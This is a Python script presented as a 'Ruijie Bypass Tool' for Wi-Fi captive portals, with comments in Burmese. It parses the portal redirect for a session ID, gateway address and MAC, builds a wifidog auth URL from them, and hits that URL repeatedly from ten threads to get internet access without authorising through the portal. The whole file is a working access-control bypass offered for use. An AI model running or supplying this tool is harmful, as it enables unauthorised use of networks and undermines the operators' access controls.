#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIG ---
PING_THREADS = 10
DEBUG = False

# --- COLORS ---
RED, GREEN, CYAN, YELLOW, MAGENTA, RESET = "\033[0;31m", "\033[0;32m", "\033[0;36m", "\033[0;33m", "\033[0;35m", "\033[00m"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

def check_real_internet():
    try:
        r = requests.get("http://www.google.com/generate_204", timeout=3)
        return r.status_code == 204
    except: return False

def high_speed_ping(auth_link):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            start = time.time()
            session.get(auth_link, timeout=5)
            ms = (time.time() - start) * 1000
            print(f"{GREEN}[✓]{RESET} Engine Active | Latency: {ms:.1f}ms", end="\r")
        except:
            print(f"{RED}[X]{RESET} Retrying Connection...            ", end="\r")
        time.sleep(0.1)

def start_process():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{MAGENTA}Ruijie Bypass Tool v2 (VLAN Fix){RESET}")

    while not stop_event.is_set():
        session = requests.Session()
        try:
            # Check for redirect
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            
            if r.status_code == 204:
                print(f"{GREEN}[!] Internet Active! Checking again in 5s...{RESET}", end="\r")
                time.sleep(5)
                continue

            portal_url = r.url
            parsed = urlparse(portal_url)
            params = parse_qs(parsed.query)

            # --- ID EXTRACTION ---
            # sessionId မတွေ့ရင် gw_id သို့မဟုတ် chap_id ကို ယူမယ်
            sid = params.get('sessionId', params.get('gw_id', params.get('chap_id', [None])))[0]
            gw_addr = params.get('gw_address', ['192.168.10.1'])[0] # URL ထဲက 192.168.10.1 ကို ယူမယ်
            gw_port = params.get('gw_port', ['2060'])[0]

            if not sid:
                # URL ထဲမှာ တိုက်ရိုက်မပါရင် HTML ထဲမှာ ထပ်ရှာမယ်
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r.text)
                sid = sid_match.group(1) if sid_match else "FORCE_BYPASS_MODE"

            print(f"\n{CYAN}[*] Portal Detected: {parsed.netloc}{RESET}")
            print(f"{GREEN}[✓]{RESET} Captured ID: {sid}")
            print(f"{YELLOW}[*] Gateway IP: {gw_addr}{RESET}")

            # --- AUTH LINK CONSTRUCTION ---
            # သင့် URL ထဲက parameters တွေနဲ့ အနီးစပ်ဆုံး link ဆောက်တာပါ
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&mac={params.get('mac',[''])[0]}"

            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}\n")

            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link,), daemon=True).start()

            while not stop_event.is_set():
                if check_real_internet():
                    print(f"\n{GREEN}[!!!] BYPASS SUCCESSFUL! Enjoy Internet.{RESET}")
                time.sleep(10)

        except Exception as e:
            logging.error(f"{RED}Error: {e}{RESET}")
            time.sleep(5)

if __name__ == "__main__":
    try: start_process()
    except KeyboardInterrupt: print(f"\n{RED}Stopped.{RESET}")
